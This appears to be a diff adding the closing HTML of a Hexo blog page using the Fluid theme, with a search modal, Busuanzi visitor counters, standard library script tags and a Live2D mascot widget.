+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
